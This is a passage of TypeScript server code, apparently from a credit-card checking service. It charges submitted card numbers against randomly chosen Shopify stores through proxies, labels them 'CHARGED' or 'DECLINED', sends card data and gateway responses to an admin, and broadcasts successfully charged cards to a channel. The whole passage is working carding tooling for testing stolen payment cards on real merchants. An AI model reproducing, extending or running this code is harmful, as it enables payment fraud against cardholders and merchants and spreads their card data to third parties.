          else console.log(`[SHOPIFY-CHARGE] Updated price for ${randomSite.url}: $${result.price}`);
        });
      }
    }

    // Map status
    let computedStatus: string;
    let displayStatus: string;
    
    if (result.status === 'live') {
      computedStatus = 'live';
      displayStatus = 'CHARGED';
    } else if (result.status === 'dead') {
      computedStatus = 'dead';
      displayStatus = 'DECLINED';
    } else {
      computedStatus = 'unknown';
      displayStatus = 'UNKNOWN';
    }

    const chargeAmount = result.price > 0 ? result.priceStr : (randomSite.price ? `$${Number(randomSite.price).toFixed(2)}` : 'Auto');

    // Send debug to admin for non-dead results, OR for suspicious responses
    const responseText = (result.apiResponse || result.message || '').trim().toLowerCase();
    const isSuspiciousError = result.status === 'dead' && 
      responseText === 'error:' && 
      result.price === 0;
    // Suspicious: generic "Declined" with no price (no real decline reason from gateway)
    const isVagueDecline = result.status === 'dead' && 
      responseText === 'declined' && 
      result.price === 0;
    
    if (result.status !== 'dead' || isSuspiciousError || isVagueDecline) {
      sendAdminDebug(
        cc,
        isSuspiciousError ? 'suspicious' : (isVagueDecline ? 'vague-decline' : result.status),
        result.apiResponse || result.message,
        result.rawResponse,
        profile?.username || user!.email || undefined,
        randomSite.url
      );
    }
    
    // Broadcast CHARGED cards to channel
    if (result.status === 'live') {
      notifyChargedCard(
        user!.id,
        cc,
        'CHARGED',
        result.message,
        chargeAmount,
        'Shopify Charge'
      );
    }
    
    // Parse the raw response to extract gate info for display
    let gate = 'Shopify Payments';
    try {
      let parsed = JSON.parse(result.rawResponse || '{}');
      if (parsed.detail && typeof parsed.detail === 'object') parsed = parsed.detail;
      if (parsed.Gate) gate = parsed.Gate;
    } catch { /* ignore */ }

    return new Response(
      JSON.stringify({
        computedStatus,
        apiStatus: displayStatus,
        apiMessage: result.apiResponse || result.message,
        apiTotal: chargeAmount,
        apiPrice: result.priceStr,
        apiGate: gate,
        apiSite: randomSite.url,
        status: computedStatus,
        message: result.message,
        rawResponse: result.rawResponse,
        usedSite: randomSite.url,
        allProxiesDead,
      }),
      { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
    );

  } catch (error) {
    const msg = error instanceof Error ? error.message : 'Error';
    return new Response(JSON.stringify({ error: msg, computedStatus: "unknown" }), 
      { status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' } });
  }
});
